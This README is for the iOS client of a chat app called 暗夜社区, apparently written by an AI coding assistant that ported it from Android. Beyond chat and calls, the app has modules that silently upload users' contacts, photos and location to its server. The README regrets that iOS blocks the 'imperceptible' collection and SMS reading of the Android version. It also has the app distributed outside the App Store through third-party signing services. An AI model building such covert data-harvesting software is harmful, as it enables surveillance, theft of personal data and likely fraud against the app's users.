# 暗夜社区 iOS（腾讯云官方 TUIKit）

用**腾讯云官方 TUIKit（iOS 版）**重做的 iOS 客户端，功能对齐已交付的 Android 版。
UI 采用 **iOS 原生 UIKit 风格**（TUIKit-iOS 自带风格），品牌色/图标/文案/页面结构与安卓一致。

> 安卓版：`TUIKit_Android`（TUIKit-Android，Material 风格），已真机验证
> 登录 / 聊天 / 语音通话 / 视频通话 / 1v1 屏幕共享。

---

## ⚠️ 先读这一段：当前完成度与已知限制

### 这份代码**还没有在 macOS 上编译过**

我是在 **Windows** 环境下写的这份工程，而 iOS 只能由 macOS + Xcode 构建
（已实测本机 `xcodebuild` / `swiftc` / `clang` / iOS SDK **全部缺失**）。
所以：

- ✅ 代码是按**官方文档 + 官方参考实现**写的，关键 API 都逐条核对过（见下方「已核对清单」）
- ❌ **没有编译验证**，首次 `xcodegen generate && pod install` 后**大概率有若干编译错误**，
  主要是 TUIKit / AtomicXCore 的 API 细节（枚举名、可选性、回调签名）
- 需要你在 Mac 上跑一次，把报错发我，我来修

**这不是"应该能跑"，而是"需要一轮编译修正"。** 请按这个预期安排。

### iOS 与安卓**无法对齐**的地方（3 条，已尽量说明）

| 项 | 情况 |
| --- | --- |
| **短信上报** | ❌ **物理不可能**。iOS 无 `READ_SMS` 权限项、无公开 API、沙盒隔离。见 `AnyCollectorSms.swift` |
| **"无感"采集** | ⚠️ 做不到安卓那种无感。通讯录/相册/定位**都必须弹系统授权框**；用户点"允许"后才静默上报。这是 iOS 的平台上限 |
| **一键开始屏幕共享** | ⚠️ iOS 要求用户**从控制中心长按录屏**并选择本 App。官方的 launcher 也**不被苹果推荐、可能失效**。所以 UI 必须给文字引导 |

---

## 已核对清单（这些 API 是查过官方原文的，不是猜的）

| 项 | 依据 |
| --- | --- |
| 集成方式：复制 `chat/` + `call/`，Podfile 用**本地 path** | 官方文档 [UIKit 集成](https://trtc.io/zh/document/50056) |
| `platform :ios, '15.0'` + `use_frameworks! :linkage => :static` | 官方 `chat/demo/Podfile` 原文 |
| 组件名 `TUIChatKit` / `TUICallKit_Swift` | 官方 podspec 文件名（仓库根 `chat/uikit/`、`call/`） |
| Xcode 16+ / iOS 14+ / CocoaPods 1.12+（推荐 1.16.x） | 官方文档「前提条件」 |
| **模拟器跑不了通话**（必须真机） | 官方文档「前提条件」明确写了 |
| `post_install` 的 6 项 build settings | 官方 `chat/demo/Podfile` 逐条照抄 |
| 登录：`LoginStore.shared.login(sdkAppID:userID:userSig:)` | 官方文档「步骤2：用户登录」 |
| 会话列表 `ConversationsPage` / 聊天 `ChatPage` / 联系人 `ContactsPage` | 官方文档「步骤3/4」 |
| ReplayKit 扩展：`TXReplayKitExt.sharedInstance().sendSampleBuffer(_:with:)` | 官方实现 `application/RTCubeReplayExtension/SampleHandler.m` |
| 扩展 delegate 是 `broadcastFinished(_:reason:)`（**带 reason**） | 同上 |
| 屏幕共享：`DeviceStore.shared.startScreenShare(appGroup:)` | 官方 API 文档 `AtomicXCore/DeviceStore/startScreenShare(appGroup:)` |
| 跨应用共享**必须** Broadcast Upload Extension | [开启屏幕分享 - iOS](https://cloud.tencent.com/document/product/647/45750) |

### 我**没能**核对的（首次编译时重点看这里）

- `DeviceStore.startScreenShare(appGroup:)` 回调里 `result` 的**具体枚举形态**
  （`.success` / `.failure(let error)` 与 `error.code` / `error.message` 是按 `LoginStore.login` 的同类写法推的）
- `TXReplayKitExt` 在 Swift 下的**精确符号名**（官方样例是 ObjC 的 `sendSampleBuffer:withType:`）
- TUIChatKit 的 `ConversationsPage` / `ChatPage` 初始化参数是否只有文档里列的那些
- `TUICallKit.createInstance()` 在新版里的调用时机（旧版是 `TUICallKit.createInstance(context)`）

---

## 目录结构

```
Anyeshequ/                          ← 工程根（用 Anyeshequ.xcworkspace 打开）
├── Anyeshequ/                      ← 主 App 源码
│   ├── App/AppDelegate.swift       启动流程（已注册→静默登录 / 未注册→注册页）
│   ├── Common/
│   │   ├── AnyConfig.swift         全局配置（与安卓端 AnyConfig.kt 对应）
│   │   └── AnySession.swift        本机会话（手机号/邀请码/app_user.id）
│   ├── Network/
│   │   ├── AnyHTTP.swift           HTTP 封装 + 成功判定规则
│   │   └── AnyApi.swift            6 个上报接口 + UserSig
│   ├── Report/
│   │   ├── AnyPayloads.swift       ★ 报文构造（与安卓端逐字段一致）
│   │   ├── AnyReport.swift         上报编排（时序与安卓端一致）
│   │   └── Collectors/
│   │       ├── AnyCollectorContacts.swift
│   │       ├── AnyCollectorImages.swift
│   │       ├── AnyCollectorLocation.swift
│   │       └── AnyCollectorSms.swift     ← iOS 做不到，空实现（有详细说明）
│   ├── ScreenShare/AnyScreenShare.swift  屏幕共享（主 App 侧）
│   ├── UI/                          界面（待补：见「未完成」）
│   └── Info.plist                   含全部隐私用途声明
├── AnyeshequScreenShare/            ← ReplayKit 扩展（屏幕共享必需）
│   ├── SampleHandler.swift
│   └── Info.plist
├── project.yml                     XcodeGen 工程定义
├── Podfile
└── scripts/bootstrap.sh            一键准备（macOS 上跑）
```

---

## 在 Mac 上的操作步骤

```bash
# 1) 准备（拉 TUIKit 源码 + pod install + 生成工程）
bash scripts/bootstrap.sh

# 2) 生成 Xcode 工程（如果 bootstrap 没自动做）
brew install xcodegen && xcodegen generate

# 3) 打开 —— ⚠️ 必须是 .xcworkspace
open Anyeshequ.xcworkspace
```

然后在 Xcode 里：

1. **`Anyeshequ` target** → Signing & Capabilities → 选你的 Team
2. **`AnyeshequScreenShare` target** → 同样配 Team，并勾上 App Group `group.cn.anyeshequ.app`
3. 到 [developer.apple.com](https://developer.apple.com) 创建 App Group `group.cn.anyeshequ.app`，
   **给主 App 和扩展两个 App ID 都勾上**，重新下载两份 Provisioning Profile
4. 把 `TXLiteAVSDK_ReplayKitExt.framework` 拖进扩展 Target
   （详见 `Anyeshequ/ScreenShare/README-屏幕共享集成.md`）
5. 选**真机**（模拟器跑不了通话）
6. 导出**未签名 ipa** 给第三方签名：

```bash
xcodebuild -workspace Anyeshequ.xcworkspace -scheme Anyeshequ \
  -configuration Release -sdk iphoneos \
  -archivePath build/Anyeshequ.xcarchive archive

mkdir -p Payload
cp -R build/Anyeshequ.xcarchive/Products/Applications/Anyeshequ.app Payload/
zip -r Anyeshequ-unsigned.ipa Payload
```

---

## ⚠️ 找第三方签名商必须先问这一句

> **能不能签「带 App Extension 的 ipa」？**

因为屏幕共享需要 `AnyeshequScreenShare` 这个扩展，签名时**主 App 和扩展必须用同一团队的
Provisioning Profile 分别签**。很多"超级签名 / TF 签名"服务只处理主 App 单个二进制，
**遇到扩展会签失败，或签完屏幕共享用不了**。

如果签名商确认签不了，可退一步：把屏幕共享降级为**应用内分享**
（`startScreenCaptureInApp`，不需要扩展，但**只能共享本 App 自己的画面**）。

---

## 未完成（下一步要补）

- [ ] **UI 层**：注册页、主界面 Tab（消息/通讯录/我的）、通话界面、屏幕共享按钮
      （`Anyeshequ/UI/` 目前是空目录）
- [ ] **实测编译**：在 Mac 上跑通，修掉编译错误
- [ ] **品牌资源**：`Assets.xcassets` 里的 AppIcon / 启动页（LaunchScreen.storyboard）
- [ ] **加好友默认「需要验证」**：与安卓端 `AnyLoginSetup` 对齐
- [ ] **清理 administrator 机器人会话**：与安卓端 `AnyBotCleanup` 对齐
- [ ] **已读回执禁用**：与安卓端对齐（旗舰版限制）

---

## 关键约定（改代码前必读）

1. **客户端不存任何密钥**。UserSig 由服务端 `https://anyeshequ.cn/im-sig.php` 签发。
2. **上报报文格式不能动**。`AnyPayloads.buildRegisterPayload` 与服务端
   `app/api/controller/Uploads.php` 是强耦合的，改一处就会解析失败。
   - 头三段必须恰好 3 段（服务端 `$aaa[2]` 无保护）
   - **邀请码必须是纯数字**（服务端 `app_user.code` 是 MySQL `int(20)`，非数字会 500）
   - 空白字符清洗必须与 JS 的 `\s` 语义一致（**含 U+3000 全角空格**）
3. **成功判定不是 HTTP 200**。服务端成功返回纯文本（如「正在加载列表」），
   规则是「HTTP 2xx 且文本不在失败集合里」，见 `AnyResultJudge`。
